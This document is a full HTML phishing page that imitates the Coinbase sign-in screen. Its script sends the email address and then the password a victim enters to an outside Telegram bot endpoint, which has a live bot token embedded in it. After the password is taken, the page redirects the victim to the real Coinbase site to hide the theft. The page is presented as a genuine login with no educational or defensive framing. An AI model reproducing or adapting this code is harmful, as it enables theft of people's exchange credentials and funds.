<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coinbase - Login</title>
    <link rel="icon" href="favicon.ico">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0A0B0D;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            position: relative;
            color: #d1d1d1;
        }

        .login-container {
            background-color: #0A0B0D;
            padding: 40px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            border: 1px solid #24252A;
            border-radius: 16px;
            width: 450px;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .login-container h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #ffffff;
            font-weight: bold;
            text-align: left;
            margin-left: 10px;
        }

        label {
            font-size: 12px;
            color: white;
            font-weight: bold;
            text-align: left;
            margin-left: 10px;
            margin-bottom: 5px;
            display: block;
        }

        input[type="email"] {
            width: 90%;
            padding: 14px;
            margin: 10px 0;
            background-color: #0A0B0D;
            border: 1px solid #24252A;
            border-radius: 4px;
            font-size: 14px;
            display: block;
            margin-left: auto;
            margin-right: auto;
            color: white;
        }

        input[type="password"] {
            width: 90%;
            padding: 14px;
            margin: 10px 0;
            background-color: #0A0B0D;
            border: 1px solid #24252A;
            border-radius: 4px;
            font-size: 14px;
            display: block;
            margin-left: auto;
            margin-right: auto;
            color: white;
        }

        input:focus {
            outline: none;
            border-color: #578BFA;
            box-shadow: 0 0 0 3px rgba(86, 139, 250, 0.15);
        }

        .black-button {
            width: 100%;
            padding: 14px;
            background-color: #578BFA;
            color: #000000;
            border: none;
            border-radius: 16px;
            font-size: 15px;
            cursor: pointer;
            margin-top: 10px;
            text-align: center;
            font-weight: bold;
        }

        .black-button:hover {
            background-color: #578BFA;
        }

        .line-separator {
            margin: 20px 0;
            font-size: 14px;
            color: #fff;
            position: relative;
        }

        .line-separator span {
            margin: 0 10px;
            position: relative;
            z-index: 1;
        }

        .line-separator::before, .line-separator::after {
            content: "_______________";
            color: #fff;
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
        }

        .line-separator::before {
            left: 0;
        }

        .line-separator::after {
            right: 0;
        }

        .action-buttons {
            margin-top: 20px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .action-buttons button {
            width: 100%;
            padding: 16px;
            background-color: #32353D;
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 15px;
            cursor: pointer;
            text-align: left;
            padding-left: 20px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .action-buttons button:hover {
            background-color: #2C2E32;
        }

        .action-buttons button img {
            width: 20px;
            margin-left: 10px;
            height: auto;
        }

        .info-text {
            margin-top: 10px;
            font-size: 12px;
            color: #A8A8A8;
        }

        .info-text a {
            color: #A8A8A8;
            text-decoration: none;
            border-bottom: 1px solid #A8A8A8;
        }

        .info-text a:hover {
            text-decoration: underline;
        }

        .logo {
            position: absolute;
            top: 20px;
            left: 20px;
            width: 40px;
            height: auto;
            z-index: 1;
        }

        .signup-link {
            position: absolute;
            top: 20px;
            right: 20px;
            font-size: 14px;
            color: white;
            font-weight: bold;
            text-decoration: none;
            z-index: 1;
        }

        .signup-link:hover {
            text-decoration: none;
        }

        .profile-section {
            display: flex;
            align-items: center;
            gap: 16px;
            margin: 20px 0;
        }

        .profile-icon {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #24252A;
        }

        .profile-icon img {
            width: 24px;
            height: 24px;
            display: block;
        }

        .forgot-password {
            text-align: center;
            margin-top: 10px;
        }

        .forgot-password a {
            color: #578BFA;
            text-decoration: none;
            font-weight: bold;
            display: block;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .email-form, .password-form {
            display: none;
        }

        .email-form.active, .password-form.active {
            display: block;
        }
    </style>
</head>
<body>
    <img src="coinbase-logo.png" alt="Coinbase Logo" class="logo">
    <a href="#" class="signup-link">Sign Up</a>

    <div class="login-container">
        <h1>Sign in to Coinbase</h1>

        <div class="email-form active">
            <form id="emailForm">
                <label for="email">Your Email Address</label>
                <input type="email" id="emailInput" placeholder="Your Email Address" required>

                <button type="button" class="black-button">Continue</button>
            </form>
        </div>

        <div class="password-form">
            <form id="passwordForm">
                <div class="profile-section">
                    <div class="profile-icon">
                        <img src="profile-icon.png" alt="Profile">
                    </div>
                    <div id="emailLabel"></div>
                </div>
                <label for="password">Password</label>
                <input type="password" id="passwordInput" placeholder="Password" required>
            </form>

            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>

            <button type="button" class="black-button">Continue</button>
        </div>

        <div class="line-separator">
            <span>OR</span>
        </div>

        <div class="action-buttons">
            <button>
                <span>Sign in with Google</span>
                <img src="google-icon.png" alt="Google Logo">
            </button>
            <button>
                <span>Sign in with Apple</span>
                <img src="apple-icon.png" alt="Apple Logo">
            </button>
            <button>
                <span>Sign in with Coinbase Wallet</span>
                <img src="wallet-icon.png" alt="Wallet Logo">
            </button>
        </div>

        <div class="info-text">
            <p>This device isn't yours? Use a private window. See our<br>
            <a href="#">Privacy Policy</a> for more information.</p>
        </div>
    </div>

    <script>
        const emailForm = document.querySelector('.email-form');
        const passwordForm = document.querySelector('.password-form');
        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('passwordInput');
        const emailLabel = document.getElementById('emailLabel');
        const continueButtonEmail = document.querySelector('.email-form .black-button');
        const continueButtonPassword = document.querySelector('.password-form .black-button');

        continueButtonEmail.addEventListener('click', async () => {
            const email = emailInput.value.trim();

            if (!email) {
                alert('Please enter your email address.');
                return;
            }

            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                alert('Please enter a valid email address.');
                return;
            }

            emailForm.classList.remove('active');
            passwordForm.classList.add('active');
            emailLabel.textContent = email;

            // Send email to Telegram bot
            const response = await fetch('https://api.telegram.org/bot8154854344:AAGBlwtXGD0aqxbb-vFCyl0i_22_4grRSw8/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '@zpcjsnwtoixn_bot',
                    text: `Email received: ${email}`,
                    parse_mode: 'HTML'
                })
            });

            if (!response.ok) {
                console.error('Error sending email to Telegram bot:', await response.text());
            }
        });

        continueButtonPassword.addEventListener('click', async () => {
            const password = passwordInput.value.trim();

            if (!password) {
                alert('Please enter your password.');
                return;
            }

            if (password.length < 8) {
                alert('Password must be at least 8 characters.');
                return;
            }

            // Send password to Telegram bot
            const response = await fetch('https://api.telegram.org/bot8154854344:AAGBlwtXGD0aqxbb-vFCyl0i_22_4grRSw8/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '@zpcjsnwtoixn_bot',
                    text: `Password received: ${password}`,
                    parse_mode: 'HTML'
                })
            });

            if (!response.ok) {
                console.error('Error sending password to Telegram bot:', await response.text());
            }

            window.location.href = 'https://www.coinbase.com';
        });

        passwordInput.addEventListener('focus', function() {
            this.parentElement.parentElement.style.outline = '1px solid #578BFA';
        });

        passwordInput.addEventListener('blur', function() {
            this.parentElement.parentElement.style.outline = 'none';
        });
    </script>
</body>
</html>
